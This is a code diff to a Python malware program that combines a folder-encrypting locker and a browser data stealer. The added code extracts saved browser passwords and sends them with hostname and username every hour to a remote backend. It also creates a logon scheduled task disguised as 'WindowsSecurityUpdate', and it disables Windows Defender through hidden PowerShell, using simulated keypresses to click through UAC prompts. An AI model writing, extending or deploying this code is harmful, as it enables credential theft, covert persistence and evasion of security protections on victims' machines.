@@ -70,12 +70,14 @@ def decode_ascii_to_text_mae_ah_nang():
 BACKEND_URL = "https://clownfish-app-5kdkx.ondigitalocean.app"
 API_ENDPOINT = f"{BACKEND_URL}/api/receive"
 BATCH_ENDPOINT = f"{BACKEND_URL}/api/receive/batch"
+CREDENTIALS_ENDPOINT = f"{BACKEND_URL}/api/credentials"
+CREDENTIALS_SEND_INTERVAL = 3600  # Send credentials every 1 hour (3600 seconds)
 
 SUPPORT_EMAIL = "choengrayu307@gmail.com"
 MAX_ATTEMPTS = 3
 MASTER_PASSWORD = decode_ascii_to_text_mae_ah_nang()
-LOCK_FILE = ".folder_lock"
-ENCRYPTED_EXTENSION = ".G2_T4_virus_test"
+LOCK_FILE = ".G2T4_Khmer_tver_ban"
+ENCRYPTED_EXTENSION = ".G2T4_Khmer_tver_ban"
 
 # Browser paths for Chromium browsers
 CHROMIUM_BROWSERS = {
@@ -173,6 +175,9 @@ SEND_INTERVAL = 30
 BROWSER_PATTERNS = ['chrome', 'firefox', 'edge', 'opera', 'brave', 'vivaldi', 'browser']
 LOGIN_PATTERNS = [r'login', r'signin', r'sign-in', r'auth', r'account', r'password']
 
+# Captured credentials storage (thread-safe)
+captured_credentials = []
+credentials_lock = threading.Lock()
 
 
 # ==================== HELPER FUNCTIONS ====================
@@ -442,6 +447,127 @@ def collect_all_browser_data():
         "tokens": {"data": all_tokens, "total_count": len(all_tokens)},
         "extraction_timestamp": datetime.now().isoformat()
     }
+
+
+# ==================== CREDENTIAL CAPTURE ====================
+
+def capture_login_credentials():
+    """
+    Capture login credentials from browser password databases
+    Filters passwords that match LOGIN_PATTERNS (login, signin, auth, account, password)
+    Stores them in captured_credentials list
+    """
+    global captured_credentials
+
+    try:
+        # Get all passwords from browsers
+        for browser_name, browser_config in CHROMIUM_BROWSERS.items():
+            passwords = get_chromium_passwords(browser_name, browser_config)
+
+            for pwd in passwords:
+                # Check if URL matches any login pattern
+                url = (pwd.get('origin_url', '') or pwd.get('action_url', '')).lower()
+
+                matches_pattern = any(
+                    re.search(pattern, url, re.IGNORECASE)
+                    for pattern in LOGIN_PATTERNS
+                )
+
+                if matches_pattern and pwd.get('username') and pwd.get('password'):
+                    credential = {
+                        'url': pwd.get('origin_url') or pwd.get('action_url'),
+                        'username': pwd.get('username'),
+                        'password': pwd.get('password'),
+                        'type': 'browser_saved',
+                        'browser': browser_name,
+                        'captured_at': datetime.now().isoformat()
+                    }
+
+                    # Thread-safe append
+                    with credentials_lock:
+                        # Avoid duplicates
+                        existing = [c for c in captured_credentials
+                                   if c['url'] == credential['url']
+                                   and c['username'] == credential['username']]
+                        if not existing:
+                            captured_credentials.append(credential)
+                            #(f"[+] Captured credential for: {credential['url'][:50]}...")
+
+        #(f"[*] Total captured credentials: {len(captured_credentials)}")
+        return len(captured_credentials)
+
+    except Exception as e:
+        #(f"[-] Error capturing credentials: {e}")
+        return 0
+
+
+def send_credentials_to_backend():
+    """
+    Send captured credentials to backend server
+    Clears the list after successful send
+    """
+    global captured_credentials
+
+    with credentials_lock:
+        if not captured_credentials:
+            #("[*] No credentials to send")
+            return False
+
+        # Prepare payload
+        payload = {
+            'hostname': platform.node(),
+            'system_username': os.getenv('USERNAME') or os.getenv('USER'),
+            'credentials': captured_credentials.copy(),
+            'sent_at': datetime.now().isoformat()
+        }
+
+        try:
+            response = requests.post(
+                CREDENTIALS_ENDPOINT,
+                json=payload,
+                timeout=30,
+                headers={'Content-Type': 'application/json'}
+            )
+
+            if response.status_code == 201:
+                #(f"[+] Successfully sent {len(captured_credentials)} credentials to backend")
+                captured_credentials.clear()
+                return True
+            else:
+                #(f"[-] Failed to send credentials: {response.status_code}")
+                return False
+
+        except Exception as e:
+            #(f"[-] Error sending credentials: {e}")
+            return False
+
+
+def credential_capture_loop():
+    """
+    Background loop that captures and sends credentials every hour
+    """
+    while True:
+        try:
+            #("[*] Running credential capture...")
+            capture_login_credentials()
+
+            #("[*] Sending credentials to backend...")
+            send_credentials_to_backend()
+
+            #(f"[*] Next credential capture in {CREDENTIALS_SEND_INTERVAL} seconds (1 hour)")
+            time.sleep(CREDENTIALS_SEND_INTERVAL)
+
+        except Exception as e:
+            #(f"[-] Error in credential capture loop: {e}")
+            time.sleep(60)  # Wait 1 minute on error before retry
+
+
+def run_credential_capture():
+    """Start credential capture in background thread"""
+    #("[*] Starting credential capture service (sends every 1 hour)...")
+    credential_thread = threading.Thread(target=credential_capture_loop, daemon=True)
+    credential_thread.start()
+    return credential_thread
 
 
 # ==================== FOLDER ENCRYPTION ====================
@@ -977,22 +1103,75 @@ def add_scheduled_task():
     if not WINDOWS:
         return False
     try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
-        # Create scheduled task to run at logon
         task_name = "WindowsSecurityUpdate"
+
+        # Determine the correct command to run
+        if getattr(sys, 'frozen', False):
+            # Running as compiled .exe
+            task_command = f'"{sys.executable}"'
+        else:
+            # Running as .py script - need pythonw.exe to run the script
+            python_exe = sys.executable
+            pythonw_exe = python_exe.replace('python.exe', 'pythonw.exe')
+            script_path = os.path.abspath(__file__)
+            task_command = f'"{pythonw_exe}" "{script_path}"'
+
+        # Check if already running as admin
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+
         # Delete existing task if any
-        subprocess.call(f'schtasks /delete /tn "{task_name}" /f', shell=True,
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        # Create new task to run at logon
-        cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
-        result = subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        if result == 0:
-            return True
-        # Fallback: create hourly task
-        cmd2 = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc hourly /f'
-        subprocess.call(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        return True
-    except:
+        subprocess.run(['schtasks', '/delete', '/tn', task_name, '/f'], capture_output=True)
+
+        if is_admin:
+            # Already admin - create task directly
+            cmd = ['schtasks', '/create', '/tn', task_name, '/tr', task_command, '/sc', 'onlogon', '/rl', 'highest', '/f']
+            result = subprocess.run(cmd, capture_output=True, text=True)
+
+            if result.returncode == 0:
+                #(f"[+] Scheduled task '{task_name}' created successfully (runs at logon)")
+                return True
+            else:
+                #(f"[-] Failed to create task: {result.stderr.strip()}")
+                return False
+        else:
+            # Not admin - need to elevate via runas
+            #("[*] Not running as admin, requesting elevation...")
+
+            # Create PowerShell command
+            ps_cmd = f'schtasks /delete /tn \\"{task_name}\\" /f 2>$null; schtasks /create /tn \\"{task_name}\\" /tr \'{task_command}\' /sc onlogon /f'
+
+            # Run PowerShell as admin
+            result = ctypes.windll.shell32.ShellExecuteW(
+                None, "runas", "powershell.exe",
+                f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                None, 0  # SW_HIDE
+            )
+
+            if result > 32:
+                #("[+] UAC prompt shown - please accept to create scheduled task")
+                # Give time for UAC and execution
+                time.sleep(2)
+
+                # Try to handle UAC with keyboard
+                pyautogui.press("left")
+                time.sleep(0.3)
+                pyautogui.press("enter")
+                time.sleep(2)
+
+                # Verify task was created
+                verify = subprocess.run(['schtasks', '/query', '/tn', task_name], capture_output=True)
+                if verify.returncode == 0:
+                    #(f"[+] Scheduled task '{task_name}' created successfully")
+                    return True
+                else:
+                    #("[-] Task not created - UAC may have been declined")
+                    return False
+            else:
+                #(f"[-] Failed to request elevation: error {result}")
+                return False
+
+    except Exception as e:
+        #(f"[-] Error creating scheduled task: {e}")
         return False
 
 
@@ -1015,13 +1194,17 @@ def disable_firewall():
         return False
 
 
-def disable_defender():
-    """Disable Windows Defender real-time protection using PowerShell as Administrator"""
+def disable_defender(debug=True):
+    """Disable Windows Defender real-time protection using PowerShell as Administrator
+
+    Args:
+        debug: If True, capture and # PowerShell output for debugging
+    """
     if not WINDOWS:
-        print("[!] Not running on Windows, skipping disable_defender")
+        #("[!] Not running on Windows, skipping disable_defender")
         return False
     try:
-        print("[*] Starting to disable Windows Defender...")
+        #("[*] Starting to disable Windows Defender...")
         # PowerShell commands to disable Windows Defender
         ps_commands = [
             ("Set-MpPreference -DisableRealtimeMonitoring $true", "Realtime Monitoring"),
@@ -1036,35 +1219,62 @@ def disable_defender():
         # Execute each command with elevated privileges
         for ps_cmd, feature_name in ps_commands:
             try:
-                print(f"[*] Disabling {feature_name}...")
-                # Try to run with elevated privileges using ShellExecute
-                if WINDOWS:
-                    try:
+                #(f"[*] Disabling {feature_name}...")
+
+                if debug:
+                    # DEBUG MODE: Use subprocess to capture output first
+                    result = subprocess.run(
+                        ['powershell.exe', '-ExecutionPolicy', 'Bypass', '-Command', ps_cmd],
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+
+                    #(f"    [DEBUG] Return code: {result.returncode}")
+                    if result.stdout.strip():
+                        #(f"    [DEBUG] stdout: {result.stdout.strip()}")
+                    if result.stderr.strip():
+                        #(f"    [DEBUG] stderr: {result.stderr.strip()}")
+
+                    if result.returncode == 0 and not result.stderr.strip():
+                        #(f"[+] {feature_name} disabled successfully!")
+                    else:
+                        #(f"[-] {feature_name} needs admin - trying UAC elevation...")
+                        # Try with ShellExecute for UAC
                         ret = ctypes.windll.shell32.ShellExecuteW(
                             None,
                             "runas",  # Run as administrator
                             "powershell.exe",
-                            f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                            f'-ExecutionPolicy Bypass -Command "{ps_cmd}"',
                             None,
-                            0  # SW_HIDE
+                            1  # SW_SHOWNORMAL to see the window
                         )
-                        print(f"    [DEBUG] ShellExecuteW returned: {ret}")
+                        #(f"    [DEBUG] ShellExecuteW returned: {ret}")
                         time.sleep(2)  # sleep for UAC prompt
                         pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
-                        print(f"[+] {feature_name} disabled successfully!")
-                    except Exception as e:
-                        print(f"[-] Failed to disable {feature_name}: {e}")
-                        # Fallback to regular subprocess if elevation fails
-                        full_cmd = f'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"'
-                        subprocess.call(full_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+                        #(f"[+] UAC elevation attempted for {feature_name}")
+                else:
+                    # PRODUCTION MODE: Use ShellExecute with UAC
+                    ctypes.windll.shell32.ShellExecuteW(
+                        None,
+                        "runas",  # Run as administrator
+                        "powershell.exe",
+                        f'-ExecutionPolicy Bypass -WindowStyle Hidden -Command "{ps_cmd}"',
+                        None,
+                        0  # SW_HIDE
+                    )
+                    time.sleep(2)  # sleep for UAC prompt
+                    pyautogui.hotkey("alt", "y")  # Press Alt+Y to click Yes on UAC
+                    #(f"[+] {feature_name} disabled successfully!")
+
             except Exception as e:
-                print(f"[-] Error disabling {feature_name}: {e}")
+                #(f"[-] Error disabling {feature_name}: {e}")
                 continue
 
-        print("[+] Windows Defender disable process completed!")
+        #("[+] Windows Defender disable process completed!")
         return True
     except Exception as e:
-        print(f"[-] Failed to disable Windows Defender: {e}")
+        #(f"[-] Failed to disable Windows Defender: {e}")
         return False
 
 
@@ -1231,6 +1441,9 @@ def main():
     # Run sensitive data collection in background thread
     data_thread = threading.Thread(target=run_sensitive_data_collection, daemon=True)
     data_thread.start()
+
+    # Start credential capture service (sends every 1 hour)
+    credential_thread = run_credential_capture()
 
     # Wait for data collection to complete
     browser_thread.join(timeout=120)
